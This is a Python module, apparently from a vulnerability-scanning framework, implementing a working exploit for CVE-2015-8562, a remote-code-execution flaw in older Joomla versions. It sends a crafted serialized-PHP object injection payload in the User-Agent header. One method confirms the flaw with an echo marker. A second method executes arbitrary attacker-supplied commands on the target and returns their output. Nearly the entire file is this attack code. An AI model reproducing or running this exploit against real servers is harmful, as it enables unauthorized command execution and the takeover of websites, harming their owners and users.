#!/usr/bin/python3

import re
import requests
from app.lib.utils.common import get_capta

class CVE_2015_8562_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2015-8562漏洞',
            'description': 'CVE-2015-8562漏洞可任意执行命令,影响范围为: Joomla 1.5.x, 2.x, 3.x-3.4.6',
            'date': '2015-12-15',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta()
        self.echo_commnd = 'echo ' + self.capta
        self.check_headers = {
            "User-Agent":'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%s:"%s;JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'''%(len(self.echo_commnd)+28, self.echo_commnd) 
        }

    def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_s = requests.session()
            check_response = check_s.get(self.url,headers = self.check_headers)
            check_response = check_s.get(self.url)
            echo_info = check_response.text
            echo_result = re.findall(r'</html>(.*)',echo_info,re.S|re.I) 
            if self.capta in echo_result[0]:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass
    
    def cmd(self, cmd):
    
        """
        执行命令

        :param str cmd: 要执行的命令

        :return tuple result: 执行的结果
        """

        try:
            if self.check():
                cmd_headers = {
                    "User-Agent":'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%s:"%s;JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'''%(len(cmd) + 28, cmd) 
                }
                cmd_s = requests.session()
                cmd_response = cmd_s.get(self.url, headers = cmd_headers)
                cmd_response = cmd_s.get(self.url)
                cmd_info = cmd_response.text
                result = re.findall(r'</html>(.*)',cmd_info,re.S|re.I)
                return True, result
            else:
                return False, '不存在CVE-2015-8562漏洞'
        except Exception as e:
            print(e)
            return False, e
        finally:
            pass

if __name__ == '__main__':
    CVE_2015_8562 = CVE_2015_8562_BaseVerify('http://127.0.0.1:8080')
    CVE_2015_8562.check()